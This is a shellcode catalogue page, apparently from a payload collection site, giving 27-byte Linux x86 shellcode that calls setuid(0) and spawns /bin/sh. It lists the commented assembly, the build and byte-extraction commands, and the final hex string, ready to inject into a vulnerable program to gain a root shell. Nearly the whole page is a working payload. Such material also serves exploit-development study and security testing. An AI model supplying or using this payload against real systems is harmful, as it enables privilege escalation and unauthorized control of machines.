---
layout: default
title: setuid(0); execve("/bin/sh", NULL, 0) - Set UID to 0 and spawn shell
permalink: /shellcode/asm-05.html
os: Linux
arch: Intel x86
length: 27
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor ecx, ecx		; null ecx
	xor ebx, ebx		; null ebx
	mul ebx			; eax, ebx, edx = 0

	mov al, 0x17		; move setuid syscall number into al (eax)
	int 0x80		; call setuid

	push eax		; push null terminator
	push 0x68732f2f		; push "//sh"
	push 0x6e69622f		; push "/bin"
	mov ebx, esp		; move pointer to "/bin//sh" into ebx

	mov al, 0xb		; move execve ssycall number into al (eax)
	int 0x80		; call execve
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf -o code.o code.asm

# Link
ld -m elf_i386 -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xc9\x31\xdb\xf7\xe3\xb0\x17\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```